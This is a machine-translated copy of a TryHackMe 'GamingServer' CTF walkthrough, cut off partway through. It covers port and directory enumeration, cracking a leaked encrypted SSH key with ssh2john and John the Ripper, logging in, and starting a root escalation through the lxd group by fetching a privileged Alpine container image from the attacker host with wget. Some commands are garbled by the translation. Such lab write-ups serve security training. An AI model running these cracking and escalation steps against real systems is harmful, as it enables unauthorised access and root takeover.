<html>
<head>
<title>TryHackMe- GamingServer CTF Writeup (Detailed)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe- GamingServer CTF报道(详细)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-gamingserver-ctf-writeup-detailed-72915ab3c238?source=collection_archive---------1-----------------------#2020-11-03">https://infosecwriteups.com/tryhackme-gamingserver-ctf-writeup-detailed-72915ab3c238?source=collection_archive---------1-----------------------#2020-11-03</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/67bd73f421d9db1aa50da66b71ff1a8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8i2VBQUhEI6maSLuNDbBFQ.png"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">CTF报道#18</figcaption></figure><p id="c7c0" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">欢迎各位！！我们将在<a class="ld le ep" href="https://medium.com/u/dc49a0a3cb16?source=post_page-----72915ab3c238--------------------------------" rel="noopener" target="_blank"> TryHackMe </a>做游戏服务器CTF。</p><div class="lf lg gp gr lh li"><a href="https://tryhackme.com/room/gamingserver" rel="noopener  ugc nofollow" target="_blank"><div class="lj ab fo"><div class="lk ab ll cl cj lm"><h2 class="bd iu gy z fp ln fr fs lo fu fw is bi translated">游戏服务器</h2><div class="lp l"><h3 class="bd b gy z fp ln fr fs lo fu fw dk translated">TryHackMe是一个学习和教授网络安全的在线平台，全部通过您的浏览器完成。</h3></div><div class="lq l"><p class="bd b dl z fp ln fr fs lo fu fw dk translated">tryhackme.com</p></div></div><div class="lr l"><div class="ls l lt lu lv lr lw jz li"/></div></div></a></div><p id="3036" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">CTF由以下作者创作:</p><div class="lf lg gp gr lh li"><a href="https://tryhackme.com/p/SuitGuy" rel="noopener  ugc nofollow" target="_blank"><div class="lj ab fo"><div class="lk ab ll cl cj lm"><h2 class="bd iu gy z fp ln fr fs lo fu fw is bi translated">西装男</h2><div class="lp l"><h3 class="bd b gy z fp ln fr fs lo fu fw dk translated">TryHackMe是一个学习和教授网络安全的在线平台，全部通过您的浏览器完成。</h3></div><div class="lq l"><p class="bd b dl z fp ln fr fs lo fu fw dk translated">tryhackme.com</p></div></div><div class="lr l"><div class="lx l lt lu lv lr lw jz li"/></div></div></a></div><p id="2fc7" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">为您的CTF计算机创建一个目录，并为nmap创建一个目录来存储您的Nmap扫描输出。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ly"><img src="../Images/b46e3e727898c1f2b0a9b1c95b967afb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OKgyhNV-SOw9wgBYScnl5g.png"/></div></div></figure><p id="8b06" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们开始吧！！享受流动吧！！</p><figure class="lz ma mb mc gt ju"><div class="bz fp l di"><div class="md me l"/></div></figure><h2 id="0da4" class="mf mg it bd mh mi mj dn mk ml mm dp mn kq mo mp mq ku mr ms mt ky mu mv mw mx bi translated">任务1- Boot2root:</h2><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi my"><img src="../Images/2144c760eedac51790c8c9b6d5b55cd6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*qiBrmZtnP5bp8n2T"/></div></div><figcaption class="kb kc gj gh gi kd ke bd b be z dk translated">任务列表</figcaption></figure><h2 id="d7b2" class="mf mg it bd mh mi mj dn mk ml mm dp mn kq mo mp mq ku mr ms mt ky mu mv mw mx bi translated">Nmap扫描:</h2><blockquote class="mz na nb"><p id="fdd9" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated"><em class="it">nmap-sC-sV-p--oN nmap/gaming server _ all ports&lt;TARGET _ IP&gt;T4】</em></p><p id="7d62" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">-sC:默认脚本<br/> -sV:版本检测<br/> -oN:输出将存储在您之前创建的“nmap”目录中<br/> -p-:扫描所有端口</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ng"><img src="../Images/090087d6957c362b4f5c404060f4892d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OF7TN2b-jM2m36p9JHhdTA.png"/></div></div></figure><p id="c6ac" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们打开了两个端口:<br/>22/ssh-OpenSSH 7.6p 1<br/>80/http-Apache httpd 2 . 4 . 29<br/>检测到OS-Ubuntu Linux</p><h2 id="5be8" class="mf mg it bd mh mi mj dn mk ml mm dp mn kq mo mp mq ku mr ms mt ky mu mv mw mx bi translated"><strong class="ak"> Gobuster : </strong></h2><blockquote class="mz na nb"><p id="4aed" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated"><em class="it">gobuster dir-u http://&lt;TARGET _ IP&gt;-w&lt;PATH _ TO _ word list&gt;-o&lt;OUTPUT _ FILE _ NAME&gt;-x&lt;扩展名&gt; </em></p><p id="1622" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">-u:URL<br/>-w:word list<br/>-q:quiet，静默扫描。将隐藏横幅。<br/> -o:输出将存储在目录<br/> -x:搜索扩展名，如html、txt、php、phtml等。</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nh"><img src="../Images/cd68b81828112f15614a3d28e50d6c5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*btfBvL-W6cEAoE8YkZUD5A.png"/></div></div></figure><p id="a435" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">gobuster扫描输出发现了一些目录和robots.txt。我们将逐一检查。</p><blockquote class="mz na nb"><p id="dfed" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">导航到http:// <target_ip/></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ni"><img src="../Images/9c4b67098e94be8899cdc4ea4696225c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_fzZqwLFQYbGQkSGim3kAg.png"/></div></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nj"><img src="../Images/2a0382cac167db40961b4f8eaa7c596b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nwgZV0BfMXQhwfRzhnApqw.png"/></div></div></figure><p id="72ba" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">检查页面的源代码是否有隐藏的注释总是好的。查看URL页的源代码。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nk"><img src="../Images/5edac3b8607d224a82bde039292c323f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t1dXJolxR2U_8le6X94xog.png"/></div></div></figure><p id="d099" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">厉害！！我们有一个潜在的用户名，我们可以使用它作为参考。让我们继续枚举过程。</p><blockquote class="mz na nb"><p id="203a" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">导航到http:// <target_ip> /robots.txt</target_ip></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/eb689ea7b39a9ff86043136b5a0eeee8.png" data-original-src="https://miro.medium.com/v2/resize:fit:964/format:webp/1*FwYtQKKmz9tpixjRzqP22A.png"/></div></figure><p id="0b68" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们已经知道了/uploads目录。</p><blockquote class="mz na nb"><p id="540d" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">导航到http://<target_ip>/上传</target_ip></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/d97a7c0f5c73b5215ce8b34ed353005e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1302/format:webp/1*Acdv-an1M9Y8SN7A3oiHXw.png"/></div></figure><p id="08c6" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">上传目录中有3个文件。我们会逐一检查，如果重要的话会保存下来。</p><blockquote class="mz na nb"><p id="f14b" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">字典列表</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/f82c1b8132b8c3dc01dc33058b4543b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*tV3Hop1qechQj7jdChD_pA.png"/></div></figure><p id="fd2c" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">事实上，这是一个重要的单词表，因此我们将把它保存到我们的主机上，因为如果需要的话，我们可能需要它来进行暴力破解。我们省省吧。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi no"><img src="../Images/130e08cdd71a89900699c87a9aa0c15a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*u4YwbeOoAMvf-tl2cpBgtw.png"/></div></div></figure><blockquote class="mz na nb"><p id="2345" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">manifesto.txt</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi np"><img src="../Images/bbd256d7d40cd55f612a50a5afc87b44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jEhIsqynp5jIeRMCfxDt5A.png"/></div></div></figure><p id="6273" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">这份文件是1986年1月8日由一名计算机安全黑客写的一篇短文，他以导师为名。该宣言对全世界的黑客，尤其是该领域的新手来说，是一个指导方针。我会推荐大家通读一下，只是为了知识。知识就是力量😃。</p><blockquote class="mz na nb"><p id="8111" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">meme.jpg</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nq"><img src="../Images/dee60cc3519ac05a4a7d90cd61fcac1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wKvB62AbQcnZ8XlHtNXruA.png"/></div></div></figure><p id="be17" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">只是一个迷因。没什么重要的。</p><blockquote class="mz na nb"><p id="947a" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">导航到http:// <target_ip> /secret</target_ip></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/e140af1feac5313fdace066fead2c282.png" data-original-src="https://miro.medium.com/v2/resize:fit:990/format:webp/1*9s0K-IpiA8p5qpz9VmLigg.png"/></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/d25a85581858b67a99900e56ff6fa749.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*qy-Tfb_WkOkPSXfvLAs_5A.png"/></div></figure><p id="23f3" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">太棒了！！我们有一个加密的RSA密钥，我们需要解密它。它将帮助我们作为用户获得外壳。</p><p id="c000" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们保存这个键[Ctrl+S]或者简单地复制并粘贴到一个文本编辑器中。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi no"><img src="../Images/c91d4ad981c45aaa3ba3841630e542b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RF8iePfq0GY1UmzamXx8xg.png"/></div></div></figure><p id="a128" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们必须解密RSA密钥，为此，我们可以使用一个非常棒的脚本，将ssh密钥转换为开膛手工具john可以理解的格式，然后使用单词列表暴力破解密钥，以找到允许我们登录ssh的正确短语或密码。</p><div class="lf lg gp gr lh li"><a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py" rel="noopener  ugc nofollow" target="_blank"><div class="lj ab fo"><div class="lk ab ll cl cj lm"><h2 class="bd iu gy z fp ln fr fs lo fu fw is bi translated">openwall/约翰</h2><div class="lp l"><h3 class="bd b gy z fp ln fr fs lo fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="lq l"><p class="bd b dl z fp ln fr fs lo fu fw dk translated">github.com</p></div></div><div class="lr l"><div class="nt l lt lu lv lr lw jz li"/></div></div></a></div><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nu"><img src="../Images/1e1a84792cb0400c33dda41e0fa7d6d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yfQJH_lBf2hNxskL0iIgqg.png"/></div></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nv"><img src="../Images/8041edaeb90fe3b280e54e9d3d93db4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r77l59jvZw1SXrSJK_GR-w.png"/></div></div></figure><p id="4625" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">在我们将脚本保存到主机上之后，使用“chmod +x ssh2john.py”命令使其可执行是很重要的。</p><p id="f788" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们可以执行脚本，使用id_rsa文件作为输入并保存输出。</p><blockquote class="mz na nb"><p id="f161" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated"><em class="it">。/ssh 2 John . py secret key&gt;for John . txt</em></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nw"><img src="../Images/1c12f0ed8d4e0cd92a312824c0abff6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sVTMFWxv1Ir2KPMCy0gvEA.png"/></div></div></figure><p id="37ae" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们可以看到下面的输出文件。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nx"><img src="../Images/0752e46e69b117c90b010b46b74c5fb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ArvaP14h9TQNP-OPesrFeQ.png"/></div></div></figure><p id="48b3" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们将启动开膛手约翰工具，并使用输出文件对我们从上传目录中获得的单词列表进行暴力破解。开膛手约翰将完美地完成这一任务。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ny"><img src="../Images/5c7bdcb137605c23d96582fc58913fe5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*evFnRcooojSqS3JB_iVtWQ.png"/></div></div></figure><p id="4caa" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">太棒了。！在一瞬间，我们获得了ssh密钥的密码。我们可以使用secretkey文件进行ssh，以从源代码中获得的“john”用户身份登录。当提示输入密码短语时，我们可以使用通过开膛手约翰破解的密码短语并获得外壳。</p><p id="d2c8" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">在我们ssh之前，我们需要“chmod 600 secretkey”</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nz"><img src="../Images/8fa7484f2d6340af4f8d8ce25c0105e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2M6GAmIjs0PZj6-im_jZmg.png"/></div></div></figure><figure class="lz ma mb mc gt ju"><div class="bz fp l di"><div class="oa me l"/></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ob"><img src="../Images/694fd7a8cf1b383eea2f5e91c5616a6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qivL-TBLlZ9f7gbZ9bZ0KA.png"/></div></div></figure><p id="ac65" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">太棒了。！我们进去了。<br/>我们已经成功地在盒子上站稳了脚跟，现在让我们抓住用户的旗帜。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/34a91fe33c768b97bc93fa5f670dfd6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/1*O_BxIvQDeW12g4T4AV5ANw.png"/></div></figure><p id="2fc8" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">提交吧。</p><blockquote class="mz na nb"><p id="58ea" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">#1.什么是用户标志？<br/>答:xxxxxxxxxxxxxxxxxxxxxxxxxx</p></blockquote><p id="e9bf" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">现在怎么办？是的，你认为它是正确的。我们需要提升权限以成为根用户并获取根标志。</p><p id="e80d" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们开始寻找任何攻击媒介。我们将进行一些手动枚举，如果我们找不到任何攻击向量，那么我们将运行linpeas，这是一个非常棒的自动枚举脚本，可以显示99%的潜在攻击向量。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi od"><img src="../Images/9985f59bd3656c6e6e8a7ac7f4ed3456.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GvNohLqylFeXCpmgqgm2sQ.png"/></div></div></figure><p id="d471" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">使用“id”命令显示用户“john”所在的用户组。<br/>看到服务lxd归root所有，任何人都可以使用，还是挺有意思的。</p><p id="ec3b" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">LXD是下一代系统容器经理。它提供了类似于虚拟机的用户体验，但是使用了Linux容器。它是基于映像的，带有可用于大量Linux发行版的预制映像，并且是围绕一个非常强大但非常简单的REST API构建的。</p><p id="ee85" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们很有可能会尝试使用lxd服务来提升我们的权限。让我们从你我最好的朋友谷歌开始吧。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oe"><img src="../Images/3480d1ad1feca98581cf5d7109b9a245.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H_q9VM7v1ts5hbi2Gn_Q_A.png"/></div></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi of"><img src="../Images/560c8ccff220d8f99501184706e9e4ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RCcEAMwrSWKGf3uEAw2UOw.png"/></div></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div class="gh gi og"><img src="../Images/38a855dd06baf7cacffb6577c2d961ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:884/format:webp/1*-LsenRzwKmTbEwGU0xd9yg.png"/></div></figure><p id="a61e" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">让我们在我们的主机上克隆它。</p><blockquote class="mz na nb"><p id="5c67" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">git克隆<git_link/></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oh"><img src="../Images/282839dc44309f7e881ea12867cebf37.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U0ciSyVjOoFCu4mYxYn4Lw.png"/></div></div></figure><p id="2082" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">克隆的。在安装的目录中导航。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oi"><img src="../Images/ead177dcd38293f98fa9df4008137974.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NaXtLl0-reYAHpigOCGYVQ.png"/></div></div></figure><blockquote class="mz na nb"><p id="de7f" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">。/build-阿尔卑斯山</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oj"><img src="../Images/b6e3fded9065cac11d061bec0ad7777f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*su3uo_XjLfie84GxWLnMqg.png"/></div></div></figure><p id="25fa" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">总共会有19个软件包需要安装，完成后我们可以看到一个. tar.gz文件。</p><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ok"><img src="../Images/4ee630a882b1c7c0756c171c6fb9c5fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*faE24jexCyTauOpErvYOTw.png"/></div></div></figure><p id="44ca" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们需要在目标机器上传输这个. tar.gz文件，这样我们就可以使用python启动一个简单的HTTPServer。您应该始终记住位于您打算使用HTTP服务器传输的目录中，即lxd-alpine-builder是我们在启动HTTP服务器之前必须位于的目录。</p><blockquote class="mz na nb"><p id="1315" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">python -m SimpleHTTPServer</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ol"><img src="../Images/c486810315e10541a3b1d40dee3d8272.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*quMOvjNpPbCjE5XnL1wYWA.png"/></div></div></figure><p id="5bd1" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">在目标机器上，只需“wget”这个. tar.gz文件，它就会像魔法一样工作。</p><blockquote class="mz na nb"><p id="7427" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">wget "http://LHOST/ <alpine_image.tar.gz>"</alpine_image.tar.gz></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ny"><img src="../Images/2852ddddb88415e808240ed547529556.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pgOWQ4BWCjoVRce7CwDtug.png"/></div></div></figure><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi of"><img src="../Images/47e28072cc05672b3756b2a08541843f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UWdTaGe0420tpKhemCG_UA.png"/></div></div></figure><p id="d0b4" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我们将按照lxd-alpine-builder的github页面中提供的说明发出命令。</p><blockquote class="mz na nb"><p id="b76d" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc图像导入。/<alpine_image.tar.gz>——别名<image_name/></alpine_image.tar.gz></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nu"><img src="../Images/9d176fe33cd8c32f71fb42e359b71900.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wp_1aVaOA33L_Tbub7Uuyg.png"/></div></div></figure><p id="4b4d" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">我用别名作为lxdimage你可以使用你选择的名字。我们已经将图像导入lxd并获得了指纹散列。</p><p id="47d2" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">太棒了！！让我们确认图像已经导入</p><blockquote class="mz na nb"><p id="1d14" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc图像列表</p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi om"><img src="../Images/3d8abf190c2211e55c9d2b877cc95f19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KmSR_0R7RvpL-E3U24NpdA.png"/></div></div></figure><p id="c11f" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">既然已经创建了映像，我们将使用该映像通过以下命令创建一台机器:</p><blockquote class="mz na nb"><p id="b336" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc init<image_name><machine_name>-c security . privileged = true</machine_name></image_name></p></blockquote><figure class="lz ma mb mc gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi on"><img src="../Images/ce919564848ed780086028662b722d4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PP2TywxsDxHs703Ww8ArXg.png"/></div></div></figure><p id="6308" class="pw-post-body-paragraph kf kg it kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">确认机器已创建。</p><blockquote class="mz na nb"><p id="6a93" class="kf kg nc kh b ki kj kk kl km kn ko kp nd kr ks kt ne kv kw kx nf kz la lb lc im bi translated">lxc列表</p></blockquote><figure class="lz ma mb mc gt ju gh gi 